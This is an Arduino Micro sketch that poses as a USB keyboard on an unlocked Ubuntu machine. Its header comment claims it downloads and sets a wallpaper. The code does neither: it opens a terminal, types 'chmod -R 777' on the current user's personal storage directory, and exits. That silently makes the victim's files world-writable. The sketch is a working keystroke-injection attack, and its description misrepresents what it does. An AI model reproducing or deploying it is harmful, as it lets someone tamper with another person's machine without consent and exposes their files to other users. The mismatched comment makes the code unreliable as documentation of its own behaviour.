/*
  Arduino Micro (USB HID) script for Ubuntu GNOME:
  - Open terminal
  - Download an image to /tmp/wall.jpg
  - Set it as wallpaper

  Notes:
  - Requires Keyboard library and a board with native USB (Micro/Leonardo/etc.)
  - The computer must already be unlocked and focused
*/

#include <Keyboard.h>

void typeLine(const char *text) {
  Keyboard.print(text);
  Keyboard.write(KEY_RETURN);
}

void setup() {
  Keyboard.begin();

  // Give the OS time to recognize the USB device
  delay(3000);

  // Open GNOME Terminal (Ubuntu default)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();

  // Wait for terminal to open and focus
  delay(1000);

  // Switch input source (GNOME default: Super+Space) to US layout.
  // Make sure US layout is added in GNOME input sources.
  // Keyboard.press(KEY_LEFT_GUI);
  // Keyboard.press(' ');
  // delay(100);
  // Keyboard.releaseAll();
  // delay(300);

  // Run chmod 777 recursively on the path with whoami result
  typeLine("chmod -R 777 /sgoinfre/goinfre/Perso/$(whoami)");
  Keyboard.releaseAll();
  typeLine("exit");

  Keyboard.end();
}

void loop() {
  // Do nothing
}
